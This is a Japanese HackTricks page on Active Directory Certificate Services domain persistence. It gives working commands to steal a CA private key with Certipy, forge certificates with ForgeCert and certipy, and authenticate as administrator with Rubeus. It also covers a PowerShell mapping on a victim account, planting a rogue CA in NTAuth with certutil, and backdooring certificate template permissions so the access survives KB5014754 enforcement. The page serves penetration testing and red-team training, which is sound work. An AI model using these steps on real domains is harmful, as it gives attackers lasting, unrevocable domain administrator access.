# AD CS ドメイン永続化

{{#include ../../../banners/hacktricks-training.md}}

**これは [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) で共有されているドメイン永続化手法の要約です。詳細はそちらを確認してください。**

## 盗まれた CA 証明書で証明書を偽造する - DPERSIST1

証明書が CA 証明書であるかどうかはどのように判断しますか？

証明書が CA 証明書であると判断できるのは、いくつかの条件が満たされている場合です:

- 証明書は CA サーバーに保存されており、その秘密鍵はマシンの DPAPI によって保護されているか、OS が対応している場合は TPM/HSM のようなハードウェアで保護されている。
- 証明書の Issuer および Subject フィールドの両方が CA の distinguished name と一致する。
- CA 証明書にのみ "CA Version" 拡張が存在する。
- 証明書は Extended Key Usage (EKU) フィールドを欠いている。

この証明書の秘密鍵を抽出するには、CA サーバー上の certsrv.msc ツールが組み込みの GUI を介したサポートされた方法です。とはいえ、この証明書はシステム内に保存されている他の証明書と異なるものではないため、[THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) のような手法を用いて抽出することも可能です。

証明書と秘密鍵は、次のコマンドを使用して Certipy で取得することもできます:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
CA証明書とその秘密鍵（`.pfx`形式）を入手したら、[ForgeCert](https://github.com/GhostPack/ForgeCert)のようなツールを使って有効な証明書を生成できます:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> 証明書偽造の対象となるユーザーは、処理を成功させるために Active Directory 上でアクティブで認証可能である必要があります。krbtgt のような特殊アカウントに対する証明書偽造は効果がありません。

この偽造された証明書は、指定された終了日まで、かつ**ルート CA 証明書が有効な限り**（通常 5 年〜**10+ 年**）**有効**です。これは**マシン**にも有効であるため、**S4U2Self** と組み合わせることで、攻撃者は CA 証明書が有効な限り**任意のドメインマシン上で永続性を維持**できます。\
さらに、**この方法で生成された証明書**は CA が認識していないため、**取り消すことができません**。

### Operating under Strong Certificate Mapping Enforcement (2025+)

2025年2月11日以降（KB5014754 の展開後）、ドメインコントローラーは証明書マッピングに対してデフォルトで **Full Enforcement** になります。実務的には、これは偽造証明書が次のいずれかを満たす必要があることを意味します：

- ターゲットアカウントへの強いバインディングを含む（例えば、SID セキュリティ拡張）、または
- 対象オブジェクトの `altSecurityIdentities` 属性に強力で明示的なマッピングを設定する

永続化のための確実な手法は、盗まれた Enterprise CA にチェーンされた偽造証明書を作成し、被害者プリンシパルに強力で明示的なマッピングを追加することです：
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
注意
- SID security extension を含む forged certificates を作成できれば、それらは Full Enforcement 下でも暗黙的にマッピングされます。そうでなければ、明示的で強力なマッピングを優先してください。明示的マッピングの詳細は [account-persistence](account-persistence.md) を参照してください。
- 失効はここでは防御側に有効ではありません: forged certificates は CA database に登録されていないため、失効させることができません。

## 不正な CA 証明書を信頼させる - DPERSIST2

`NTAuthCertificates` オブジェクトは、Active Directory (AD) が利用する `cacertificate` 属性内に1つ以上の **CA certificates** を含むよう定義されています。  
認証を行う **domain controller** の検証プロセスでは、`NTAuthCertificates` オブジェクトを調べ、認証対象の **certificate** の Issuer フィールドに指定された **CA specified** に一致するエントリがあるかを確認します。一致が見つかれば認証が行われます。

攻撃者がこの AD オブジェクトを制御している場合、自己署名の CA 証明書を `NTAuthCertificates` オブジェクトに追加できます。通常、このオブジェクトを変更できるのは **Enterprise Admin** グループのメンバー、または **forest root’s domain** 内の **Domain Admins** や **Administrators** のみです。`certutil.exe` を使って `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA` コマンドで `NTAuthCertificates` オブジェクトを編集するか、[**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool) を利用して追加できます。

この手法で役立つ追加コマンド:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
この機能は、前述の ForgeCert を用いて証明書を動的に生成する方法と併用した場合に特に有効です。

> Post-2025 のマッピングに関する考慮事項：NTAuth に rogue CA を配置しても発行 CA に対する信頼が確立されるだけです。DC が **Full Enforcement** の状態で leaf certificate をログオンに使うには、leaf が SID セキュリティ拡張を含むか、ターゲットオブジェクトに強い明示的なマッピング（例えば `altSecurityIdentities` 内の Issuer+Serial）が存在する必要があります。詳細は {{#ref}}account-persistence.md{{#endref}} を参照してください。

## 悪意ある設定ミス - DPERSIST3

**security descriptor modifications of AD CS** コンポーネントを通じた **persistence** の機会は多く存在します。"[Domain Escalation](domain-escalation.md)" セクションで説明された変更は、権限を持つ攻撃者によって悪意を持って実施され得ます。これには、以下のような機密コンポーネントへの "control rights"（例: WriteOwner/WriteDACL/等）追加が含まれます:

- **CA server’s AD computer** オブジェクト
- **CA server’s RPC/DCOM server**
- **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** 内の任意の **descendant AD object or container**（例: Certificate Templates container、Certification Authorities container、NTAuthCertificates object 等）
- 組織や既定で **AD CS を制御する権限が委譲された AD groups**（例: built-in Cert Publishers group とそのメンバー）

悪意ある実装の一例としては、ドメイン内で **elevated permissions** を持つ攻撃者がデフォルトの **`User`** certificate template に **`WriteOwner`** 権限を追加し、その攻撃者自身を権利の主体にするケースが考えられます。これを悪用するために、攻撃者はまず **`User`** テンプレートの所有権を自らに変更します。続いてテンプレート上で **`mspki-certificate-name-flag`** を **1** に設定して **`ENROLLEE_SUPPLIES_SUBJECT`** を有効化し、リクエスト時に Subject Alternative Name を申請者が指定できるようにします。以降、攻撃者はその **template** を使って **enroll** し、代替名に **domain administrator** の名前を指定して取得した証明書を DA としての認証に利用できます。

長期的なドメイン persistence のために攻撃者が設定し得る実用的な調整点（詳細と検出については {{#ref}}domain-escalation.md{{#endref}} を参照）:

- CA policy flags that allow SAN from requesters（例: `EDITF_ATTRIBUTESUBJECTALTNAME2` を有効化）。これにより ESC1-like な経路が引き続き悪用可能になります。
- Template の DACL や設定で認証可能な発行を許可するもの（例: Client Authentication EKU の追加、`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` の有効化）。
- ディフェンダーがクリーンアップを試みた場合でも rogue issuer を継続的に再導入するために、`NTAuthCertificates` オブジェクトや CA コンテナを制御すること。

> [!TIP]
> KB5014754 適用後の強化された環境では、これらの misconfigurations に明示的な強いマッピング（`altSecurityIdentities`）を組み合わせることで、DC が強いマッピングを強制している場合でも発行または偽造した証明書が引き続き利用可能になることが保証されます。

## 参考

- Microsoft KB5014754 – Windows domain controllers における証明書ベースの認証の変更（適用スケジュールと強いマッピング）。 https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy – コマンドリファレンスおよび forge/auth の使用法。 https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
{{#include ../../../banners/hacktricks-training.md}}
